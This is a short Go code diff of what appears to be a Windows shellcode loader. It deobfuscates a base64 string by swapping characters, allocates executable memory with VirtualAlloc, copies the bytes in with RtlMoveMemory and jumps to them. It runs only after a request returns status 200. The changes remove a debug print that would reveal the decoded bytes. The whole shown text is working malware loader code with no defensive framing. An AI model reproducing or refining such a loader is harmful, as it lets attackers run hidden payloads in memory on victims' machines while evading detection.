@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/base64"
-	"fmt"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -21,7 +20,6 @@ func build(ddm string){
 	str3 :=strings.Replace(str2, "@", "1", -1 )
 	str4 :=strings.Replace(str3, ")", "T", -1 )
 	sDec,_ := base64.StdEncoding.DecodeString(str4) 
-	fmt.Println(sDec)
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
 	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
 	syscall.Syscall(addr, 0, 0, 0, 0)
@@ -40,8 +38,6 @@ func main() {
 	if err != nil {
 		return
 	}
-
-
 	var y int = 200
 	if resCode == y {
 	build("payload")
